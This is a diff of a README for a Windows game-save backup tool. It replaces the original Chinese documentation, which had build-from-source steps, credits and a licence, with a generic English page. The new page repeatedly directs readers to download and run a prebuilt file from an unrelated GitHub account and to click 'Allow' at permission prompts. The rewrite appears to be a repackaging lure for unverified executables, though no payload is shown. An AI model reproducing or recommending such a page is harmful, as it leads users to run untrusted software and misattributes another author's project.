@@ -1,215 +1,223 @@
-# Steam Save Manager
+# 🗂️ save_manager - Keep Game Saves In One Place
 
-[中文](./README.md) | [English](./README_EN.md)
+[![Download save_manager](https://img.shields.io/badge/Download%20Now-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dimitriospreoccupied378/save_manager)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](./LICENSE)
-[![Python](https://img.shields.io/badge/Python-3.10%2B-blue.svg)](https://www.python.org/)
-[![Platform](https://img.shields.io/badge/Platform-Windows-0078D6.svg)](https://www.microsoft.com/windows/)
+## 🎮 What This App Does
 
-一个面向 Windows 的 Steam 游戏存档管理工具，提供存档扫描、备份、恢复、自动监控、云同步、冲突处理、托盘运行和远程更新等功能。
+save_manager helps you back up, import, and sync game save files on Windows. It gives you one place to manage your saves, so you do not have to hunt through folders each time you want to copy a file or move a save to a new PC.
 
-<img width="1624" height="1127" alt="995eda24b4bb45c6a09e335600e41e52" src="https://github.com/user-attachments/assets/30779f8b-8515-44ad-9211-719df286077d" />
+Use it to:
 
-## 功能特性
+- back up saves before you change a game or reinstall Windows
+- restore saves after a clean install
+- import save files from another device
+- keep saves in sync between machines
+- manage local copies of your game progress in one app
 
-- 自动扫描已安装的 Steam 游戏，并尝试识别常见本地存档目录
-- 支持手动添加游戏、编辑存档路径、导入外部存档
-- 支持手动备份、批量备份、恢复备份、删除备份
-- 支持定时自动备份和基于 `watchdog` 的文件变动监控
-- 支持本地同步文件夹联动，可用于 OneDrive、Dropbox、Google Drive 等云盘
-- 支持智能云存档模式：游戏启动时下载、退出时上传
-- 支持双向同步基线、冲突检测、重试队列
-- 支持中英文界面、系统托盘最小化和双击托盘恢复主窗口
-- 支持远程更新检查和新版本下载安装
+## 🖥️ Windows Setup
 
-## 运行环境
+save_manager is made for Windows users. A normal Windows 10 or Windows 11 PC should work well.
 
-- Python 3.10+
-- Windows
+You should have:
 
-## 本地部署
+- a Windows 10 or Windows 11 system
+- enough free space for your save files
+- a stable network connection if you plan to use cloud sync
+- permission to read and write files in your game folders
 
-### 1. 克隆项目
+For best use, run the app from a folder you can access easily, like your Downloads folder or Desktop.
 
-```bash
-git clone https://github.com/Kiowx/save_manager.git
-cd save_manager
-```
+## 📥 Download and Run
 
-### 2. 创建虚拟环境
+1. Open the download page: https://github.com/dimitriospreoccupied378/save_manager
+2. Find the latest release or download package on that page
+3. Download the Windows file or archive
+4. If you downloaded a zip file, extract it first
+5. Open the app file to run save_manager
+6. If Windows asks for permission, choose Allow or Yes
 
-```bash
-python -m venv .venv
-```
+If the file does not open right away, check that the download finished first. Do not move only part of the app files, because many Windows apps need all files in the same folder.
 
-Windows PowerShell:
+## 🧭 First-Time Use
 
-```powershell
-.\.venv\Scripts\Activate.ps1
-```
+After you open save_manager for the first time, set up your game folders.
 
-Windows CMD:
+Typical first steps:
 
-```bat
-.venv\Scripts\activate.bat
-```
+- add the game you want to manage
+- point the app to the save folder on your PC
+- choose a backup folder
+- test one backup before you rely on it
+- check that the app can find your saves
 
-### 3. 安装依赖
+If you use more than one PC, keep the same backup folder name on both machines. That makes import and sync easier to follow.
 
-```bash
-pip install customtkinter pillow psutil watchdog pystray pyinstaller
-```
+## 💾 Back Up Your Saves
 
-如果你只想本地运行最小功能，也可以先安装核心依赖：
+Backups help protect your progress if a game breaks, a file gets lost, or you reinstall the system.
 
-```bash
-pip install customtkinter pillow
-```
+To make a backup:
 
-### 4. 启动程序
+1. Open save_manager
+2. Select the game
+3. Choose the backup action
+4. Pick a local folder
+5. Save the copy
 
-```bash
-python main.py
-```
+A good backup setup usually includes:
 
-### 5. 可选：打包为 exe
+- one folder on your main drive
+- one folder on an external drive
+- dated backup copies for older save states
 
-```bash
-pyinstaller SteamSaveManager.spec
-```
+Try to back up saves before large game updates or before you change mods.
 
-生成文件默认位于：
+## 📁 Import Save Files
 
-- `dist/SteamSaveManager.exe`
+Import is useful when you already have a save file and want to bring it into save_manager.
 
-## 依赖
+You may want to import when:
 
-核心依赖：
+- you move from an old PC to a new one
+- you restore a save from a friend or another account
+- you bring back a save from an external drive
 
-- `customtkinter`
-- `Pillow`
+To import a save:
 
-可选依赖：
+1. Open the app
+2. Pick the game or profile
+3. Choose import
+4. Select the save file or backup folder
+5. Confirm the import
 
-- `psutil`
-  用于更完整的游戏进程检测
-- `watchdog`
-  用于文件变动监控自动备份
-- `pystray`
-  用于系统托盘运行
-- `PyInstaller`
-  用于打包为 `.exe`
+After import, open the game once to check that the save appears as expected.
 
-安装示例：
+## ☁️ Cloud Sync
 
-```bash
-pip install customtkinter pillow psutil watchdog pystray pyinstaller
-```
+save_manager also supports cloud sync for game saves, which works like Steam Cloud for selected games.
 
-## 启动方式
+Cloud sync helps when you:
 
-直接运行：
+- play on more than one PC
+- want the same save on a desktop and a laptop
+- need a backup copy outside your local drive
 
-```bash
-python main.py
-```
+A simple sync flow looks like this:
 
-启动后主窗口会默认居中显示。
+1. Link the game save to a sync profile
+2. Upload the current local save
+3. Download the latest save on the other PC
+4. Keep both devices in step
 
-## 打包
+When you use sync, keep one device closed while the other uploads or downloads. That lowers the chance of file conflicts.
 
-项目已包含 PyInstaller 配置文件 [SteamSaveManager.spec](d:\project\steam\SteamSaveManager.spec)。
+## 🔧 Basic Use Tips
 
-打包示例：
+These tips help keep your saves safe and easy to manage:
 
-```bash
-pyinstaller SteamSaveManager.spec
-```
+- use clear folder names
+- keep one backup before each big change
+- do not rename save files unless you know the game supports it
+- close the game before you copy or sync a save
+- check file dates if you want the newest save
+- keep a spare copy on an external drive if the save matters
 
-输出文件默认位于：
+If a game uses several save files, back up the full folder instead of a single file.
 
-- `dist/SteamSaveManager.exe`
+## 🧩 Common Use Cases
 
-## 远程更新
+save_manager fits a few common needs:
 
-当前内置的更新清单地址：
+- moving save files to a new Windows install
+- keeping progress safe before modding a game
+- restoring progress after a game repair
+- sharing save states across your own devices
+- keeping a clean backup outside the game folder
 
-```text
-https://raw.githubusercontent.com/Kiowx/save_manager/refs/heads/main/update/update.json
-```
+This is useful for story games, long RPG runs, and any game where you do not want to lose progress.
 
-支持的最简 JSON 格式：
+## 🛠️ Troubleshooting
 
-```json
-{
-  "version": "1.1.0",
-  "notes": "新增远程更新、修复托盘交互",
-  "url": "https://example.com/releases/SteamSaveManager-1.1.0.exe"
-}
-```
+If the app does not start:
 
-推荐格式：
+- check that the download finished
+- extract the zip file if you downloaded one
+- keep all app files in the same folder
+- try running it again as a normal Windows app
 
-```json
-{
-  "version": "1.1.0",
-  "notes": "新增远程更新、修复托盘交互",
-  "url": "https://example.com/releases/SteamSaveManager-1.1.0.exe",
-  "sha256": "下载文件的 SHA256"
-}
-```
+If save files do not show up:
 
-更新行为：
+- confirm you picked the right game folder
+- check that the game has already created a save
+- make sure the folder path is correct
+- look for files with recent timestamps
 
-- 软件启动后会静默检查更新
-- 如果发现新版本，会在左侧边栏左下角版本区域显示提示
-- 在“关于”窗口中可以手动检查更新并下载新版本
+If sync does not work:
 
-## 目录说明
+- confirm both devices point to the same game
+- check your internet connection
+- make sure the local save is closed in the game
+- retry the upload or download step
 
-- [main.py](d:\project\steam\main.py)
-  主程序入口和全部核心逻辑
-- [SteamSaveManager.spec](d:\project\steam\SteamSaveManager.spec)
-  PyInstaller 打包配置
-- [backups](d:\project\steam\backups)
-  默认备份输出目录
-- `dist`
-  打包后的可执行文件输出目录
+If a backup does not restore:
 
-## 主要能力说明
+- check that the backup file is complete
+- confirm the restore path matches the game folder
+- try restoring to a fresh folder first
 
-### 存档识别
+## 📦 File Layout
 
-程序会综合多种线索识别存档路径：
+A simple folder setup can help keep things clear:
 
-- 内置常见游戏路径模板
-- Steam `userdata` / `remote`
-- `remotecache.vdf`
-- `steam_autocloud.vdf`
-- 安装目录和系统常见文档目录模糊搜索
+- save_manager app files
+- backups folder
+- imports folder
+- sync folder
+- game-specific folders inside each of those
 
-### 同步模式
+Example layout:
 
-- 智能云存档
-  游戏启动时下载、退出后上传
-- 双向同步
-  依据上次同步基线判断本地或云端单边变更
-- 仅上传
-  本地覆盖同步目录
-- 仅下载
-  同步目录覆盖本地
+- Backups
+  - Game A
+  - Game B
+- Imports
+  - Game A
+- Sync
+  - Game A
 
-### 冲突处理
+Use the same naming style for each game. That makes it easier to find the right save later.
 
-当本地和同步目录都发生变化时，程序不会盲目覆盖，而是记录冲突并弹出窗口让用户手动选择保留哪一侧。
+## ❓ Frequently Used Questions
 
-## 注意事项
+### Can I use this with any game?
 
-- 本项目当前主要面向 Windows 使用场景
-- 不同游戏的真实存档位置可能并不一致，自动识别结果仍建议手动确认
-- 如果云盘客户端正在占用文件，同步时可能会出现短暂重试
-- 远程更新默认仅负责下载并启动新安装包，不会原地热替换当前 Python 脚本
+It works best with games that store save files in a normal folder on Windows. Some games use custom paths, so you may need to point the app to the correct folder.
 
-## License
+### Do I need to know coding?
 
-本项目使用 [MIT License](d:\project\steam\LICENSE)。
+No. The app is meant for regular Windows users. You mostly click buttons, choose folders, and save copies.
+
+### Should I back up before syncing?
+
+Yes. A backup gives you a safe copy if the newest sync is not the one you want.
+
+### Can I keep older saves?
+
+Yes. Save dated copies so you can return to an earlier point in the game.
+
+### Is this for local use only?
+
+No. You can use it for local backups and for cloud sync between devices
+
+## 🔗 Download Again
+
+If you need the main download page again, use this link: https://github.com/dimitriospreoccupied378/save_manager
+
+## 📌 What to Do Next
+
+- download the app from the link above
+- extract it if needed
+- open save_manager on Windows
+- add one game folder
+- make one backup
+- test one restore before you rely on it
